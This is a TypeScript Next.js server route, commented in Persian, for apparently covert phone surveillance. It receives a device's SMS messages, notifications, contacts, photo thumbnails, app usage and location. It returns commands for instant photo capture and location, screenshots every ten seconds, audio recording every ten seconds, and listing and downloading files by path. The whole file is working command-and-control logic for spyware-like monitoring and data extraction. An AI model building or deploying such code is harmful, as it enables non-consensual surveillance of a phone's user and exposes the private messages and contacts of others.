import { NextRequest, NextResponse } from "next/server";
import { db } from "@/lib/db";
import { isValidDayKey, dayKeyToStart } from "@/lib/days";

/**
 * همگام‌سازی دوره‌ای دستگاه.
 * هدر: X-Device-Token
 * بدنه: {
 *   battery?: number,
 *   apps?: [{ packageName, label, controlled }],
 *   usage?: [{ day: "YYYY-MM-DD", packageName, minutes }],
 *   sms?: [{ id, address, body, date, type }],
 *   notifications?: [{ id, packageName, title, text, at }],
 *   photos?: [{ mediaId, takenAt, size, bucket }],
 *   thumbs?: [{ mediaId, image }],
 *   contacts?: [{ name, phones: ["0912...", ...] }],
 *   location?: { lat, lng, accuracy?, provider?, at },
 *   accessibilityEnabled?: boolean  // آیا سرویس Accessibility روی گوشی فعال است؟
 * }
 * پاسخ: { ok, serverTime, commands: [{ id, type }] } — فرمان‌های در انتظار
 * (مثل عکس‌برداری یا مکان‌یابی فوری) که دستگاه باید اجرا کند.
 */
export async function POST(req: NextRequest) {
  const token = req.headers.get("x-device-token");
  if (!token) {
    return NextResponse.json({ error: "توکن دستگاه لازم است" }, { status: 401 });
  }

  const device = await db.device.findUnique({ where: { token } });
  if (!device) {
    return NextResponse.json({ error: "توکن نامعتبر است" }, { status: 401 });
  }

  let body: Record<string, unknown>;
  try {
    body = await req.json();
  } catch {
    return NextResponse.json({ error: "درخواست نامعتبر" }, { status: 400 });
  }

  // --- اعتبارسنجی ورودی‌ها ---

  const battery =
    typeof body?.battery === "number" && body.battery >= 0 && body.battery <= 100
      ? Math.round(body.battery)
      : null;

  // آیا سرویس Accessibility روی گوشی فعال است؟ (گزارش از دستگاه)
  const accessibilityEnabled =
    typeof body?.accessibilityEnabled === "boolean" ? body.accessibilityEnabled : null;

  const rawApps = Array.isArray(body?.apps) ? body.apps : null;
  const apps = rawApps
    ? rawApps
        .filter(
          (a): a is { packageName: string; label: string; controlled?: boolean } =>
            typeof a?.packageName === "string" &&
            typeof a?.label === "string" &&
            a.packageName.length > 0 &&
            a.packageName.length <= 200
        )
        .slice(0, 1000)
        .map((a) => ({
          packageName: a.packageName,
          label: a.label.slice(0, 120),
          controlled: Boolean(a.controlled),
        }))
    : null;

  const rawUsage = Array.isArray(body?.usage) ? body.usage : null;
  const usage = rawUsage
    ? rawUsage
        .filter(
          (u): u is { day: string; packageName: string; minutes: number } =>
            isValidDayKey(u?.day) &&
            typeof u?.packageName === "string" &&
            u.packageName.length > 0 &&
            typeof u?.minutes === "number" &&
            Number.isFinite(u.minutes)
        )
        .slice(0, 2000)
        .map((u) => ({
          day: u.day,
          packageName: u.packageName,
          minutes: Math.max(0, Math.min(24 * 60, Math.round(u.minutes))),
        }))
    : null;

  // پیامک‌ها
  const rawSms = Array.isArray(body?.sms) ? body.sms : null;
  const sms = rawSms
    ? rawSms
        .filter(
          (s): s is { id: number; address: string; body: string; date: number; type: number } =>
            Number.isInteger(s?.id) &&
            (s?.id as number) > 0 &&
            Number.isFinite(s?.date) &&
            typeof s?.address === "string" &&
            typeof s?.body === "string" &&
            Number.isInteger(s?.type)
        )
        .slice(0, 400)
        .map((s) => ({
          smsId: s.id,
          address: s.address.slice(0, 80),
          body: s.body.slice(0, 2000),
          type: Math.max(0, Math.min(9, s.type)),
          at: new Date(s.date),
        }))
    : null;

  // اعلان‌ها
  const rawNotifs = Array.isArray(body?.notifications) ? body.notifications : null;
  const notifs = rawNotifs
    ? rawNotifs
        .filter(
          (n): n is { id: number; packageName: string; title: string; text: string; at: number } =>
            Number.isInteger(n?.id) &&
            (n?.id as number) > 0 &&
            Number.isFinite(n?.at) &&
            typeof n?.packageName === "string" &&
            typeof n?.title === "string" &&
            typeof n?.text === "string"
        )
        .slice(0, 300)
        .map((n) => ({
          localId: n.id,
          packageName: n.packageName.slice(0, 200),
          title: n.title.slice(0, 300),
          text: n.text.slice(0, 1000),
          at: new Date(n.at),
        }))
    : null;

  // ایندکس گالری
  const rawPhotos = Array.isArray(body?.photos) ? body.photos : null;
  const photos = rawPhotos
    ? rawPhotos
        .filter(
          (p): p is { mediaId: number; takenAt: number; size: number; bucket: string } =>
            Number.isInteger(p?.mediaId) &&
            (p?.mediaId as number) > 0 &&
            Number.isFinite(p?.takenAt) &&
            Number.isFinite(p?.size) &&
            typeof p?.bucket === "string"
        )
        .slice(0, 600)
        .map((p) => ({
          mediaId: p.mediaId,
          takenAt: new Date(p.takenAt),
          size: Math.max(0, Math.min(2 ** 31 - 1, Math.round(p.size))),
          bucket: p.bucket.slice(0, 80),
        }))
    : null;

  // thumbnail ها (base64)
  const rawThumbs = Array.isArray(body?.thumbs) ? body.thumbs : null;
  const thumbs = rawThumbs
    ? rawThumbs
        .filter(
          (t): t is { mediaId: number; image: string } =>
            Number.isInteger(t?.mediaId) &&
            (t?.mediaId as number) > 0 &&
            typeof t?.image === "string" &&
            t.image.length > 0 &&
            t.image.length <= 600_000
        )
        .slice(0, 24)
        .map((t) => ({ mediaId: t.mediaId, image: t.image }))
    : null;

  // مخاطبین (لیست کامل؛ هر بار جایگزین می‌شود)
  const rawContacts = Array.isArray(body?.contacts) ? body.contacts : null;
  const contacts = rawContacts
    ? rawContacts
        .filter(
          (c): c is { name: string; phones: unknown[] } =>
            typeof c?.name === "string" && c.name.trim().length > 0 && Array.isArray(c?.phones)
        )
        .slice(0, 3000)
        .map((c) => ({
          name: c.name.trim().slice(0, 150),
          phones: c.phones
            .filter((p) => typeof p === "string" && p.trim().length > 0)
            .slice(0, 10)
            .map((p) => (p as string).trim().slice(0, 40))
            .join("، "),
        }))
        .filter((c) => c.phones.length > 0)
    : null;

  // موقعیت مکانی
  const rawLoc = (body?.location ?? null) as Record<string, unknown> | null;
  const location =
    rawLoc &&
    typeof rawLoc.lat === "number" &&
    typeof rawLoc.lng === "number" &&
    Number.isFinite(rawLoc.lat) &&
    Number.isFinite(rawLoc.lng) &&
    rawLoc.lat >= -90 &&
    rawLoc.lat <= 90 &&
    rawLoc.lng >= -180 &&
    rawLoc.lng <= 180
      ? {
          lat: rawLoc.lat,
          lng: rawLoc.lng,
          accuracy:
            typeof rawLoc.accuracy === "number" && Number.isFinite(rawLoc.accuracy)
              ? Math.max(0, Math.min(100_000, rawLoc.accuracy))
              : null,
          provider: typeof rawLoc.provider === "string" ? rawLoc.provider.slice(0, 20) : null,
          at: Number.isFinite(rawLoc.at as number)
            ? new Date(rawLoc.at as number)
            : new Date(),
        }
      : null;

  const now = new Date();

  await db.$transaction(async (tx) => {
    // برنامه‌ها: جایگزینی کامل
    if (apps && apps.length > 0) {
      await tx.deviceApp.deleteMany({ where: { deviceId: device.id } });
      await tx.deviceApp.createMany({
        data: apps.map((a) => ({
          deviceId: device.id,
          packageName: a.packageName,
          label: a.label,
          controlled: a.controlled,
        })),
      });
    }

    // مصرف روزانه: جایگزینی روزهای ارسالی
    if (usage && usage.length > 0) {
      const days = [...new Set(usage.map((u) => u.day))];
      await tx.usageEntry.deleteMany({
        where: { deviceId: device.id, day: { in: days.map(dayKeyToStart) } },
      });
      await tx.usageEntry.createMany({
        data: usage.map((u) => ({
          deviceId: device.id,
          day: dayKeyToStart(u.day),
          packageName: u.packageName,
          minutes: u.minutes,
        })),
      });
    }

    // پیامک‌ها: جایگزینی پیامک‌های ارسالی (upsert بدون حذف بقیه)
    if (sms && sms.length > 0) {
      await tx.smsMessage.deleteMany({
        where: { deviceId: device.id, smsId: { in: sms.map((s) => s.smsId) } },
      });
      await tx.smsMessage.createMany({
        data: sms.map((s) => ({ deviceId: device.id, ...s })),
      });
    }

    // اعلان‌ها: مانند پیامک
    if (notifs && notifs.length > 0) {
      await tx.notificationItem.deleteMany({
        where: { deviceId: device.id, localId: { in: notifs.map((n) => n.localId) } },
      });
      await tx.notificationItem.createMany({
        data: notifs.map((n) => ({ deviceId: device.id, ...n })),
      });
    }

    // ایندکس گالری: upsert تا thumbnail موجود از بین نرود
    if (photos && photos.length > 0) {
      for (const p of photos) {
        await tx.photoEntry.upsert({
          where: { deviceId_mediaId: { deviceId: device.id, mediaId: p.mediaId } },
          create: { deviceId: device.id, ...p },
          update: { takenAt: p.takenAt, size: p.size, bucket: p.bucket },
        });
      }
    }

    // thumbnail ها
    if (thumbs && thumbs.length > 0) {
      for (const t of thumbs) {
        const buf = Buffer.from(t.image, "base64");
        if (buf.byteLength === 0) continue;
        await tx.photoEntry.upsert({
          where: { deviceId_mediaId: { deviceId: device.id, mediaId: t.mediaId } },
          create: { deviceId: device.id, mediaId: t.mediaId, thumb: buf },
          update: { thumb: buf },
        });
      }
    }

    // مخاطبین: جایگزینی کامل (مانند برنامه‌ها)
    if (contacts && contacts.length > 0) {
      await tx.contactEntry.deleteMany({ where: { deviceId: device.id } });
      await tx.contactEntry.createMany({
        data: contacts.map((c) => ({
          deviceId: device.id,
          name: c.name,
          phones: c.phones,
        })),
      });
    }

    // موقعیت: به‌روزرسانی روی دستگاه + ثبت در تاریخچه (حداکثر ۱۰۰ نقطه)
    if (location) {
      await tx.locationPing.create({
        data: { deviceId: device.id, ...location },
      });
      const keep = await tx.locationPing.findMany({
        where: { deviceId: device.id },
        orderBy: { at: "desc" },
        take: 100,
        select: { id: true },
      });
      if (keep.length === 100) {
        await tx.locationPing.deleteMany({
          where: { deviceId: device.id, id: { notIn: keep.map((k) => k.id) } },
        });
      }
      // علامت‌گذاری فرمان‌های LOCATE به‌عنوان DONE (چون دستگاه موقعیت تازه فرستاده)
      await tx.deviceCommand.updateMany({
        where: {
          deviceId: device.id,
          status: "PENDING",
          type: "LOCATE",
        },
        data: { status: "DONE", doneAt: now },
      });
    }

    await tx.device.update({
      where: { id: device.id },
      data: {
        lastSeenAt: now,
        lastSyncAt: now,
        ...(battery !== null ? { battery } : {}),
        ...(accessibilityEnabled !== null ? { accessibilityEnabled } : {}),
        ...(location
          ? {
              locLat: location.lat,
              locLng: location.lng,
              locAccuracy: location.accuracy,
              locProvider: location.provider,
              locAt: location.at,
            }
          : {}),
      },
    });

    const parts: string[] = [];
    if (apps) parts.push(apps.length + " برنامه");
    if (usage) parts.push(usage.length + " رکورد مصرف");
    if (sms) parts.push(sms.length + " پیامک");
    if (notifs) parts.push(notifs.length + " اعلان");
    if (photos) parts.push(photos.length + " عکس (ایندکس)");
    if (thumbs) parts.push(thumbs.length + " پیش‌نمایش");
    if (contacts) parts.push(contacts.length + " مخاطب");
    if (location) parts.push("موقعیت");
    await tx.eventLog.create({
      data: {
        deviceId: device.id,
        type: "SYNC",
        message: "همگام‌سازی: " + (parts.length ? parts.join("، ") : "بدون داده جدید"),
      },
    });
  });

  // فرمان‌های در انتظار (عکس‌برداری یا مکان‌یابی فوری) به دستگاه داده می‌شود؛
  // تا وقتی نتیجه‌ای نرسیده PENDING می‌ماند و در همگام‌سازی بعدی دوباره ارسال می‌شود.
  // فرمان‌های قدیمی‌تر از ۲۴ ساعت ارسال نمی‌شوند.
  const commands = await db.deviceCommand.findMany({
    where: {
      deviceId: device.id,
      status: "PENDING",
      type: { in: ["CAPTURE", "LOCATE"] },
      createdAt: { gte: new Date(Date.now() - 24 * 60 * 60 * 1000) },
    },
    orderBy: { createdAt: "desc" },
    take: 10,
    select: { id: true, type: true },
  });

  // درخواست‌های فایل در انتظار (لیست/دانلود) — دستگاه باید آن‌ها را پردازش کند.
  // قدیمی‌تر از ۷ روز را ارسال نمی‌کنیم تا اگر ادمین یادش رفته باشه، گوشی
  // همیشه مجبور نباشه چیز قدیمی رو دوباره پردازش کنه.
  const fileRequests = await db.fileRequest.findMany({
    where: {
      deviceId: device.id,
      status: "PENDING",
      createdAt: { gte: new Date(Date.now() - 7 * 24 * 60 * 60 * 1000) },
    },
    orderBy: { createdAt: "asc" },
    take: 5,
    select: { id: true, type: true, path: true },
  });

  return NextResponse.json({
    ok: true,
    serverTime: now.toISOString(),
    commands: commands.map((c) => ({
      id: c.id,
      type: c.type === "CAPTURE" ? "capture" : c.type.toLowerCase(),
    })),
    // پایش صفحه: اگر روشن باشد، دستگاه باید هر ۱۰ ثانیه یک اسکرین‌شات
    // بگیرد و به /api/device/screen بفرستد. اگر خاموش باشد، سرویس را
    // متوقف می‌کند. interval ثانیه است.
    screenMonitor: {
      enabled: device.screenMonitorEnabled,
      interval: 10,
      startedAt: device.screenMonitorStartedAt,
    },
    // ضبط صدا: اگر روشن باشد، دستگاه باید هر ۱۰ ثانیه یک قطعه‌ی صوتی
    // ضبط کند و به /api/device/audio بفرستد. اگر خاموش باشد، توقف.
    audioMonitor: {
      enabled: device.audioMonitorEnabled,
      interval: 10,
      startedAt: device.audioMonitorStartedAt,
    },
    // درخواست‌های فایل — دستگاه هر کدام را پردازش می‌کند:
    //   type="list": محتوای مسیر را در /api/device/file-listing POST می‌کند
    //   type="download": فایل را chunk به chunk در /api/device/file-chunk POST می‌کند
    fileRequests: fileRequests.map((r) => ({
      id: r.id,
      type: r.type,
      path: r.path,
    })),
  });
}
